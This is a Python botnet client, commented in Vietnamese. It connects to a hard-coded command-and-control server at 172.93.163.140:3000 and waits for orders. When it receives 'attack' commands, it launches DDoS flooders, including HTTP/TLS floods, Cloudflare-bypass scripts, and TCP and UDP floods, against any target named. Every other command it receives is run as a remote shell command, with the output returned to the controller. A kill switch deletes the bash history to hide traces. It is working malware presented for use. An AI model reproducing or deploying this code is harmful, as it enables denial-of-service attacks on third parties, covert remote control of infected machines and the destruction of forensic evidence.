import socketio
import subprocess
import time
import os

sio = socketio.Client()

# IP VPS của bạn (Đã cập nhật theo yêu cầu)
C2_SERVER_URL = 'http://172.93.163.140:3000'

@sio.event
def connect():
    print("[+] Đã xâm nhập thành công vào mạng lưới SHADOW NETWORK!")

# --- XỬ LÝ LỆNH TẤN CÔNG VÀ SHELL ---
@sio.on('executeCommand')
def on_message(command):
    print(f"[*] Nhận lệnh: {command}")
    
    # Nếu là lệnh tấn công từ Attack Flooder
    if command.startswith("attack"):
        parts = command.split(' ')
        if len(parts) < 5:
            sio.emit('botResponse', "Lệnh attack thiếu tham số!")
            return

        method = parts[1]
        target = parts[2]
        port   = parts[3]
        time_at = parts[4]

        final_cmd = ""

        # --- TỰ ĐỘNG LẮP RÁP LỆNH THEO SETUP CỦA BẠN ---
        if method == "TLS":
            final_cmd = f"node http2.js {target} {time_at} 4 4 live.txt"
        elif method == "HTTPFLOOD":
            final_cmd = f"node httpddos.js {target} {time_at} 4 4 live.txt"
        elif method == "BYPASSCF_V1":
            final_cmd = f"node bypass.js GET {target} {time_at} 2 2 live.txt --debug --full --connect"
        elif method == "BYPASSCF_V2":
            final_cmd = f"node bypassv2.js GET {target} {time_at} 2 2 live.txt --debug --full --connect --ratelimit-bypass"
        elif method == "BRS":
            final_cmd = f"node brs.js {target} {time_at} 2 2 live.txt --debug true --threads 1 --flooder true"
        elif method == "TCP":
            final_cmd = f"python3 l4.py {target} {port} 10 {time_at}"
        elif method == "UDP":
            final_cmd = f"python3 l4vip.py {target} {port} 1024 10 {time_at}"
        
        if final_cmd:
            sio.emit('botResponse', f"🚀 Khởi động {method} tới {target}...")
            # Chạy ngầm (không đợi kết thúc để tránh treo bot)
            subprocess.Popen(final_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return

    # Nếu không phải lệnh attack, chạy như lệnh Shell bình thường
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        sio.emit('botResponse', f"Thành công:\n{result[:500]}") 
    except subprocess.CalledProcessError as e:
        sio.emit('botResponse', f"Lỗi thực thi:\n{e.output[:500]}")

# --- LỆNH TỰ HỦY (KILL SWITCH) ---
@sio.on('emergencyDestroy')
def kill_switch():
    print("[!!!] KÍCH HOẠT NÚT TỰ HỦY!")
    sio.emit('botResponse', "C2 ngắt kết nối - Đang xóa dấu vết...")
    try:
        # Xóa history và log cơ bản
        subprocess.run("history -c && rm -rf ~/.bash_history", shell=True)
    except:
        pass
    os._exit(0)

if __name__ == '__main__':
    while True:
        try:
            # Type=bot để server cộng số lượng Online
            sio.connect(f"{C2_SERVER_URL}?type=bot")
            sio.wait()
        except Exception as e:
            print(f"[-] Đang tìm kiếm Trạm Chỉ Huy...")
            time.sleep(5)
